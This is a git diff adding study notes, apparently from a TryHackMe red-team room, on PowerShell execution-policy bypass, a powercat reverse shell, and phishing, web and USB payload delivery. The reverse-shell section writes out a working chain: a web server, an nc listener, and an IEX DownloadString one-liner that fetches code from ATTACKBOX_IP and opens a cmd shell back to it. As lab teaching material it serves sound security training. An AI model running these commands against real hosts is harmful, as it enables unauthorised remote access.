@@ -246,3 +246,107 @@ End Sub
 
 
 ![[Pasted image 20241106231514.png]]
+
+
+## Powershell PSH
+Powershell is a object-oriented programming language executed from the Dynamic Language Runtiume (**DLR**) in **.NET**.
+
+By default microsoft block the .ps1 script, to view the Execution policy in powershell use the `Get-ExecutionPolicy` command.
+![[Pasted image 20241109234902.png]]
+
+### Bypass Execution Policy
+
+Microsoft provides ways to disable this restriction. One of these ways is by giving an argument option to the PowerShell command to change it to your desired setting. For example, we can change it to **bypass** policy which means nothing is blocked or restricted. This is useful since that lets us run our own PowerShell scripts.  
+
+In order to make sure our PowerShell file gets executed, we need to provide the bypass option in the arguments as follows,
+```powershell
+powershell -ex bypass -File thm.ps1 Welcome to Weaponization Room!
+```
+
+
+Now, let's try to get a reverse shell using one of the tools written in PowerShell, which is powercat. On your AttackBox, download it from GitHub and run a webserver to deliver the payload.  
+
+```shell-session
+user@machine$ git clone https://github.com/besimorhino/powercat.git
+Cloning into 'powercat'...
+remote: Enumerating objects: 239, done.
+remote: Counting objects: 100% (4/4), done.
+remote: Compressing objects: 100% (4/4), done.
+remote: Total 239 (delta 0), reused 2 (delta 0), pack-reused 235
+Receiving objects: 100% (239/239), 61.75 KiB | 424.00 KiB/s, done.
+Resolving deltas: 100% (72/72), done.
+```
+
+Now, we need to set up a web server on that AttackBox to serve the powercat.ps1 that will be downloaded and executed on the target machine. Next, change the directory to powercat and start listening on a port of your choice. In our case, we will be using port 8080.
+
+```shell-session
+user@machine$ cd powercat
+user@machine$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+```
+
+On the AttackBox, we need to listen on port 1337 using nc to receive the connection back from the victim.
+
+Terminal
+
+```shell-session
+user@machine$ nc -lvp 1337
+```
+
+Now, from the victim machine, we download the payload and execute it using PowerShell payload as follows,
+
+```shell-session
+C:\Users\thm\Desktop> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
+```
+
+Now that we have executed the command above, the victim machine downloads the powercat.ps1  payload from our web server (on the AttackBox) and then executes it locally on the target using cmd.exe and sends a connection back to the AttackBox that is listening on port 1337. After a couple of seconds, we should receive the connection call back:
+
+```shell-session
+user@machine$ nc -lvp 1337  listening on [any] 1337 ...
+10.10.12.53: inverse host lookup failed: Unknown host
+connect to [10.8.232.37] from (UNKNOWN) [10.10.12.53] 49804
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Users\thm>
+```
+
+![[Pasted image 20241109235339.png]]
+
+# Delivery Techniques
+
+Delivery techniques are one of the important factors for getting initial access. They have to look professional, legitimate, and convincing to the victim in order to follow through with the content.
+
+![Emails being sent from a computer](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/54108dbd9d1c3d64fb86f2ad04b5949e.png)  
+
+  
+
+Email Delivery  
+
+It is a common method to use in order to send the payload by sending a phishing email with a link or attachment. For more info, visit [here](https://attack.mitre.org/techniques/T1566/001/). This method attaches a malicious file that could be the type we mentioned earlier. The goal is to convince the victim to visit a malicious website or download and run the malicious file to gain initial access to the victim's network or host.
+
+The red teamers should have their own infrastructure for phishing purposes. Depending on the red team engagement requirement, it requires setting up various options within the email server, including DomainKeys Identified Mail (DKIM), Sender Policy Framework (SPF), and DNS Pointer (PTR) record.
+
+The red teamers could also use third-party email services such as Google Gmail, Outlook, Yahoo, and others with good reputations.
+
+Another interesting method would be to use a compromised email account within a company to send phishing emails within the company or to others. The compromised email could be hacked by phishing or by other techniques such as password spraying attacks.
+
+![A laptop connected with various devices and networks](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/08a3f660501cf5171277534e40aa96b8.png)  
+
+### Web Delivery  
+
+Another method is hosting malicious payloads on a web server controlled by the red teamers. The web server has to follow the security guidelines such as a clean record and reputation of its domain name and TLS (Transport Layer Security) certificate. For more information, visit [here](https://attack.mitre.org/techniques/T1189/).
+
+This method includes other techniques such as social engineering the victim to visit or download the malicious file. A URL shortener could be helpful when using this method.
+
+In this method, other techniques can be combined and used. The attacker can take advantage of zero-day exploits such as exploiting vulnerable software like Java or browsers to use them in phishing emails or web delivery techniques to gain access to the victim machine.
+
+![A laptop and a smartphone with a USB cable](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/ff8ca3c104fa32e30603ecf97ee0d72e.png)  
+
+USB Delivery  
+
+This method requires the victim to plug in the malicious USB physically. This method could be effective and useful at conferences or events where the adversary can distribute the USB. For more information about USB delivery, visit [here](https://attack.mitre.org/techniques/T1091/).
+
+Often, organizations establish strong policies such as disabling USB usage within their organization environment for security purposes. While other organizations allow it in the target environment.
+
+Common USB attacks used to weaponize USB devices include [Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky-deluxe) and [USBHarpoon](https://www.minitool.com/news/usbharpoon.html), charging USB cable, such as [O.MG Cable](https://shop.hak5.org/products/omg-cable).
